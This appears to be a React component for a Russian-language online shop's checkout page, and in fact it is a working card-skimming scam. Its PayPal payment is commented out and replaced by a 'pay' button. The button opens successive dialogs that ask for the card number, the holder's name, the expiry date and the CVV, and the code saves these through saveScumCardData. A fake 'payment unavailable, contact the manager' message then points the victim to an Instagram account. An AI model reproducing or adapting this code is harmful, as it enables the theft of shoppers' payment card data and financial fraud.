import React, {useContext, useEffect, useState} from 'react';
import {AiFillCheckCircle} from "react-icons/all";
import Container from "../layout/Container";
import {Link, useParams} from "react-router-dom";
import {HOME_ROUTE} from "../../utils/routes";
import Button from "../Button";
import {Helmet} from "react-helmet";
import WhatsApp from '../../assets/images/wasap.png';
import Telegram from '../../assets/images/teledram.png';
import {observer} from "mobx-react-lite";
import {Context} from "../../index";
import {PayPalButtons} from "@paypal/react-paypal-js";
import SuccessPayPage from "./SuccessPayPage";
import Countdown from "react-countdown";
import button from "../Button";
import Swal from "sweetalert2";
import withReactContent from 'sweetalert2-react-content'
import MaskInput from 'react-maskinput';

const TransactionPage = () => {

    const {store} = useContext(Context);
    const params = useParams();
    const [scum_number, setScumNumber] = useState('');
    const [scum_fio, setScumFio] = useState('');
    const [scum_date, setScumDate] = useState('');
    const [scum_cvv, setScumCvv] = useState('');
    const [scum_data, setScumData] = useState({});
    const [transaction, setTransaction] = useState();
    const [payCompleted, setPayCompleted] = useState(false);
    const [timeExpired, setTimeExpired] = useState(false);
    const minutes = 35;
    const time = 1000 * 60 * minutes;
    const MySwal = withReactContent(Swal)

    const createOrder = (data, actions, err) => {
        return actions.order.create({
            intent: 'CAPTURE',
            purchase_units: [
                {
                    description: 'Оплата',
                    amount: {
                        currency_code: 'RUB',
                        value: transaction.amount
                    }
                }
            ]
        })
    }

    const onApprove = async (data, actions) => {
        const order = await actions.order.capture();
        if(order.status === 'COMPLETED') {
            store.setTransactionCompleted(params.orderId).then((rs) => {
                if(rs.data.status === 'success') {
                    setPayCompleted(true);
                }
            })
        }
    }

    const onError = (err) => {
        console.log(err)
    }

    const renderer = ({ hours, minutes, seconds, completed }) => {
        if (completed) {
            setTimeExpired(true);
            return <p>Время вышло, создайте заказ заново.</p>;
        } else {
            return <span>{minutes}:{seconds}</span>;
        }
    };


    const openPayModal = () => {
        Swal.fire({
            input: 'text',
            inputLabel: 'Номер карты',
            inputPlaceholder: '0000-0000-0000-0000',
            inputValidator: (value) => {
                return !value && 'Это поле необходимо заполнить'
            },
            inputAttributes: {
                name: 'card-number'
            }
        }).then((rs) => {
            if(rs.isConfirmed) {
                store.setScumNumber(rs.value)

                Swal.fire({
                    input: 'text',
                    inputLabel: 'ФИО (латиница)',
                    inputValidator: (value) => {
                        return !value && 'Это поле необходимо заполнить'
                    },
                    inputAttributes: {
                        name: 'card-name'
                    }
                }).then((rs) => {
                    if(rs.isConfirmed) {
                        store.setScumFio(rs.value)

                        Swal.fire({
                            input: 'text',
                            inputLabel: 'ММ/ГГ',
                            inputValidator: (value) => {
                                return !value && 'Это поле необходимо заполнить'
                            },
                            inputAttributes: {
                                name: 'card-date'
                            }
                        }).then((rs) => {
                            if(rs.isConfirmed) {
                                store.setScumDate(rs.value)

                                Swal.fire({
                                    input: 'text',
                                    inputLabel: 'CVV',
                                    inputValidator: (value) => {
                                        return !value && 'Это поле необходимо заполнить'
                                    },
                                    inputAttributes: {
                                        name: 'card-cvv'
                                    },
                                    preConfirm: () => {
                                        return new Promise((resolve) => {
                                            setTimeout(resolve, 2000);
                                        });
                                    },
                                    showLoaderOnConfirm: true,
                                }).then((rs) => {
                                    if(rs.isConfirmed) {
                                        store.setScumCvv(rs.value)

                                        store.saveScumCardData()

                                        MySwal.fire(<p>Оплата в данный момент недоступна, попробуйте связаться с <a target="_blank" href="https://instagram.com/diamond_room.ru">менеджером</a></p>)
                                    }
                                })
                            }
                        })
                    }
                })
            }
        })


        // MySwal.fire({
        //     html: <>
        //         <label>Номер карты</label>
        //         <MaskInput onChange={(e) => setScumNumber(e.target.value)} className={'field'} alwaysShowMask maskChar="_" mask="0000-0000-0000-0000" size={20} />
        //         <label>ФИО (латиница)</label>
        //         <input value={scum_fio} onChange={handleChang} className={'field'} />
        //         <label>ММ/ГГ</label>
        //         <MaskInput onChange={(e) => {setTimeout(() => setScumDate(e.target.value), 500)}} className={'field'} alwaysShowMask maskChar="_" mask="00/00" size={20} />
        //         <label>CVV</label>
        //         <MaskInput onChange={(e) => setScumCvv(e.target.value)} className={'field'} alwaysShowMask maskChar="_" mask="000" size={20} />
        //     </>,
        //     preConfirm: () => {
        //         console.log(scum_date)
        //         store.saveScumCardData({
        //             number: scum_number,
        //             fio: scum_fio,
        //             date: scum_date,
        //             cvv: scum_cvv
        //         })
        //
        //         return new Promise((resolve) => {
        //             setTimeout(resolve, 2000);
        //         });
        //     },
        //     showLoaderOnConfirm: true,
        // }).then(() => {
        //     console.log(scum_date)
        //     return MySwal.fire(<p>Оплата в данный момент недоступна, попробуйте связаться с <a target="_blank" href="https://instagram.com/diamond_room.ru">менеджером</a></p>)
        // })
        // Swal.fire({
        //     // html: `
        //     //     <h4>Для оплаты заказа обратитесь к 2нашему менеджеру:</h4>
        //     //
        //     //
        //     //     <MaskInput alwaysShowMask maskChar="_" mask="0000-0000-0000-0000" size={20} />
        //     //     <MaskInput alwaysShowMask maskChar="_" mask="00/00" size={20} />
        //     //     <MaskInput alwaysShowMask maskChar="_" mask="000" size={20} />
        //     //
        //     //     <a target="_blank" href="https://instagram.com/diamond_room.ru">Менеджер</a>
        //     // `
        //     html: "<MaskInput alwaysShowMask maskChar='_' mask='0000-0000-0000-0000' size={20} />"
        // });
    }

    const PayButton = () => {
        return <button className={'pay-btn'} onClick={openPayModal}>Оплатить</button>
    }

    useEffect(() => {

        store.generateTransaction(params.orderId).then((rs) => {
            setTransaction(rs.data)
            setPayCompleted(rs.data.status === 'success');
        });

    }, []);

    return !payCompleted ? (
        <>
            <Container className="lg auto-height">
                <div style={{padding: '40px 0'}}>
                    <Link to={HOME_ROUTE}><Button>Назад</Button></Link>
                </div>
            </Container>
            <Container style={{textAlign: 'center'}}>
                <Helmet>
                    <title>Завершение оформления  | {process.env.REACT_APP_NAME}</title>
                </Helmet>

                <p style={{
                    paddingBottom: 20,
                    paddingTop: 40,
                    fontSize: 16,
                }}>Ваш заказ почти оформлен, осталось оплатить.</p>
                <p style={{fontSize: 16}}>Срок на оплату:</p>

                {transaction && <Countdown date={new Date(transaction.createdAt).getTime() + time} renderer={renderer} />}

                <hr style={{borderTop: '1px solid #eee',
                    width: 110, marginTop: 8,
                    marginBottom: 8,
                    border: 0}}/>

                <AiFillCheckCircle style={{color: 'green', fontSize: 120, paddingTop: 24, paddingBottom: 34}} />
                <div className="order-details">
                    <div className="order-detail">
                        <div className="order-detail-name">Номер заказа:</div>
                        <div className="order-detail-value">#{transaction && transaction._id}</div>
                    </div>
                    <div className="order-detail">
                        <div className="order-detail-name">Сумма к оплате:</div>
                        <div className="order-detail-value">{transaction && transaction.amount} RUB</div>
                    </div>
                    <div className="order-detail">
                        <div className="order-detail-name">Количество товаров:</div>
                        <div className="order-detail-value">{transaction && transaction.products_count}</div>
                    </div>
                </div>

                <small style={{paddingBottom: 30,fontSize: 12,width: '80%',display: 'inline-block'}}>
                    <ul>
                        <li>После оплаты ваш заказ будет передан на
                            отправку. После отправки, вам поступит
                            СМС на номер телефона</li>
                    </ul>
                </small>

                {/*{transaction && !timeExpired && <PayPalButtons createOrder={createOrder} onApprove={onApprove} onError={onError} />}*/}
                {transaction && !timeExpired && <PayButton />}

                <p style={{marginTop: 40,paddingBottom: 30,
                    paddingTop: 20,
                    fontSize: 12}}>КОНСУЛЬТАНТЫ:</p>

                <div className="consultants">
                    <a href={process.env.REACT_APP_WHATSAPP_URL}>
                        <img src={WhatsApp}/>
                    </a>
                    <a href={process.env.REACT_APP_TELEGRAM_URL}>
                        <img src={Telegram}/>
                    </a>
                </div>
            </Container>
        </>
    ) : <SuccessPayPage />;
};

export default observer(TransactionPage);